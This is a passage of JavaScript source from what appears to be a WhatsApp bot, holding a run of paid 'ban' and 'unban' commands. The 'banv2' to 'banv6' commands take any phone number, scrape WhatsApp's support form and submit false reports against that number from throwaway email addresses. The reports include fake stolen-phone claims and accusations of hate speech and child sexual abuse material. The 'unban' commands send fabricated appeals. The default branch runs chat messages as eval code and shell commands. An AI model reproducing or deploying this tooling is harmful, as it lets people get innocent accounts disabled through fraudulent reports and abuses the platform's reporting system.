              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv2":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv3":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv4":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv5":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv6":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv1":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv2":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv3":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv4":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv5":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args[0])
            return replyLinkGc(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let xeonnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let xeontesx = await OctopusBotzz.onWhatsApp(xeonnumx);
          if (xeontesx.length == 0)
            return replyLinkGc(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let xeonxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = xeonxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(xeonxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", xeonnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;

      default:
        if (budy.startsWith("=>")) {
          if (!isCreator) return XeonStickOwner();
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(sul);
            }
            return replyLinkGc(bang);
          }
          try {
            replyLinkGc(
              util.format(eval(`(async () => { return ${budy.slice(3)} })()`))
            );
          } catch (e) {
            replyLinkGc(String(e));
          }
        }

        if (budy.startsWith(">")) {
          if (!isCreator) return XeonStickOwner();
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await replyLinkGc(evaled);
          } catch (err) {
            await replyLinkGc(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!isCreator) return XeonStickOwner();
          exec(budy.slice(2), (err, stdout) => {
            if (err) return replyLinkGc(err);
            if (stdout) return replyLinkGc(stdout);
          });
        }
        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.data.database;
          if (!(budy.toLowerCase() in msgs)) return;
          OctopusBotzz.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {
            quoted: m,
          });
        }
    }
  } catch (err) {
    console.log(util.format(err));
    let e = String(err);
    OctopusBotzz.sendMessage("6281359391296@s.whatsapp.net", {
      text:
        "Hello developer, there seems to be an error, please fix it " +
        util.format(e),
      contextInfo: {
        forwardingScore: 9999999,
        isForwarded: true,
      },
    });
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("already-exists")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Socket connection timeout")) return;
  }
};
